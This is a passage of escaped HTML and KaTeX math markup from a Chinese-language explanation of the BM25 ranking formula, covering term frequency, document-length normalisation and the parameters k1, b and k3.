class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3448em;&#34;&gt;&lt;span style=&#34;top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15122857142857138em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.403331em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，其中&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;tf_{td}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;是单词在文档d中词频，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;L_d&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;是文档d的长度，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;L_{ave}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.83333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;e&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;是所有文档的平均长度，变量&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;k_1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;是一个正的参数，用来标准化文章词频的范围，当&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;k_1=0&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，就是一个二元模型，一个更大的值对应使用更原始的词频信息。&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;b&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;是另一个可调参数(0&amp;lt;b&amp;lt;1)，它是用决定使用文档长度来表示信息量的范围：当b为1时，时完全使用文档长度来权衡词的权重，当b为0表示不使用文档长度。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;单词&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;q_i&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;与query之间的相似性：&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;当query很长时，我们还需要刻画单词与query之间的权重(对于短的query，这一项不是必须的)，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;S(q_i,Q)=\frac{(k_3+1)tf_{tq}}{k_e+tf_{tq}}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31166399999999994em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;i&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.5746399999999998em;vertical-align:-0.5423199999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.03232em;&#34;&gt;&lt;span style=&#34;top:-2.655em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.16454285714285719em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;e&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.29634285714285713em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2818857142857143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.50732em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mopen mtight&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.31731428571428577em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.03148em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose mtight&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.29634285714285713em;&#34;&gt;&lt;span style=&#34;top:-2.357em;margin-left:-0.10764em;margin-right:0.07142857142857144em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.5em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2818857142857143em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.5423199999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，这里&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;tf_{tq}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.980548em;vertical-align:-0.286108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.28055599999999997em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; 